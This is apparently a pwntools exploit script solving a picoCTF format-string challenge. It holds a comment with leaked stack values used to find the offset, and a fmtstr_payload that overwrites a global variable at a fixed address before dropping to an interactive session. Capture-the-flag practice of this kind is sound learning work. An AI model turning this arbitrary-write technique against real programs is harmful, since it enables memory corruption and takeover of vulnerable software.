from pwn import *

exe = ELF('./vuln')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *printf
        continue
    """)
elif args.REMOTE:
    io = remote("rhea.picoctf.net", 57625)


# %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
# Here's your input: 0x402075-(nil)-0x7fa8a92f0a00-(nil)-0x23f46b0-(nil)-(nil)-(nil)-0x7fa8a931737c-0x7fa8a9346af0-0x7fa8a930c590-0x3055e4-0x7fa8a930c584-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x7fa8a9300070

sus = 0x404060

writes = {sus: 0x67616c66}
offset = 14
payload = fmtstr_payload(offset, writes)
io.sendlineafter(b'?', payload)

io.interactive()